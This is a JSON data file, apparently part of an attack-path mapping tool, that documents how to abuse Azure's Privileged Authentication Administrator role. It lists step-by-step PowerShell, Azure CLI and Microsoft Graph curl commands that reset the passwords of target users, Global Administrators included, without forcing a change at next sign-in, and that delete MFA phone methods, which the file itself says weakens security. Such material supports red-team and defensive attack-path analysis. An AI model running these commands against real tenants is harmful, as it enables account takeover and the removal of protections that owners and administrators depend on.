{
    "AZPrivilegedAuthAdmin": {
        "meaning": "This edge indicates the principal has the Privileged Authentication Administrator role active against the target tenant. Principals with this role can update sensitive properties for all users and can set or reset any authentication method (including passwords) for any user, including Global Administrators.",
        "common": "",
        "windows": {
            "Password_Reset": [
                {
                    "order": 1,
                    "command": "Connect-AzureAD -AccountId privileged_auth_admin@domain.com",
                    "description": "Connect to Azure AD using Privileged Authentication Administrator account"
                },
                {
                    "order": 2,
                    "command": "$NewPassword = ConvertTo-SecureString \"NewP@ssw0rd123!\" -AsPlainText -Force",
                    "description": "Create secure string for new password"
                },
                {
                    "order": 3,
                    "command": "Set-AzureADUserPassword -ObjectId TARGET_USER_ID -Password $NewPassword -ForceChangePasswordNextLogin $false",
                    "description": "Reset target user password including Global Administrators"
                }
            ],
            "Authentication_Method_Management": [
                {
                    "order": 1,
                    "command": "Connect-MgGraph -Scopes \"UserAuthenticationMethod.ReadWrite.All\"",
                    "description": "Connect to Microsoft Graph with authentication method permissions"
                },
                {
                    "order": 2,
                    "command": "New-MgUserAuthenticationPasswordMethod -UserId TARGET_USER_ID -Password \"NewP@ssw0rd123!\"",
                    "description": "Add new password authentication method for target user"
                },
                {
                    "order": 3,
                    "command": "Remove-MgUserAuthenticationPhoneMethod -UserId TARGET_USER_ID -PhoneAuthenticationMethodId METHOD_ID",
                    "description": "Remove existing MFA phone methods to weaken security"
                }
            ],
            "Azure_Portal": [
                {
                    "order": 1,
                    "command": "# Navigate to Azure Portal -> Azure Active Directory -> Users",
                    "description": "Access user management in Azure portal"
                },
                {
                    "order": 2,
                    "command": "# Select target user -> Authentication methods or Reset password",
                    "description": "Access authentication management for target user"
                },
                {
                    "order": 3,
                    "command": "# Reset password or modify authentication methods",
                    "description": "Use privileged authentication admin rights to reset credentials"
                }
            ]
        },
        "linux": {
            "Azure_CLI": [
                {
                    "order": 1,
                    "command": "az login --username privileged_auth_admin@domain.com --password password",
                    "description": "Authenticate using Privileged Authentication Administrator account"
                },
                {
                    "order": 2,
                    "command": "az ad user update --id TARGET_USER_ID --force-change-password-next-sign-in false --password \"NewP@ssw0rd123!\"",
                    "description": "Reset target user password using Azure CLI"
                },
                {
                    "order": 3,
                    "command": "az ad user show --id TARGET_USER_ID --query '{displayName:displayName, userPrincipalName:userPrincipalName}'",
                    "description": "Verify target user information after password reset"
                }
            ],
            "Microsoft_Graph_API": [
                {
                    "order": 1,
                    "command": "curl -X PATCH 'https://graph.microsoft.com/v1.0/users/{target-user-id}' -H 'Authorization: Bearer $ACCESS_TOKEN' -H 'Content-Type: application/json' -d '{\"passwordProfile\": {\"password\": \"NewP@ssw0rd123!\", \"forceChangePasswordNextSignIn\": false}}'",
                    "description": "Reset user password using Microsoft Graph API"
                },
                {
                    "order": 2,
                    "command": "curl -X GET 'https://graph.microsoft.com/v1.0/users/{target-user-id}/authentication/methods' -H 'Authorization: Bearer $ACCESS_TOKEN'",
                    "description": "List current authentication methods for target user"
                },
                {
                    "order": 3,
                    "command": "curl -X DELETE 'https://graph.microsoft.com/v1.0/users/{target-user-id}/authentication/phoneMethods/{method-id}' -H 'Authorization: Bearer $ACCESS_TOKEN'",
                    "description": "Remove MFA phone methods to weaken account security"
                }
            ],
            "PowerShell_Core": [
                {
                    "order": 1,
                    "command": "pwsh -c \"Connect-AzureAD -AccountId privileged_auth_admin@domain.com\"",
                    "description": "Connect to Azure AD using PowerShell Core on Linux"
                },
                {
                    "order": 2,
                    "command": "pwsh -c \"Set-AzureADUserPassword -ObjectId TARGET_USER_ID -Password (ConvertTo-SecureString 'NewP@ssw0rd123!' -AsPlainText -Force)\"",
                    "description": "Reset target user password using PowerShell Core"
                },
                {
                    "order": 3,
                    "command": "pwsh -c \"Get-AzureADUser -ObjectId TARGET_USER_ID | Select DisplayName, UserPrincipalName\"",
                    "description": "Verify target user details after authentication changes"
                }
            ]
        }
    }
}
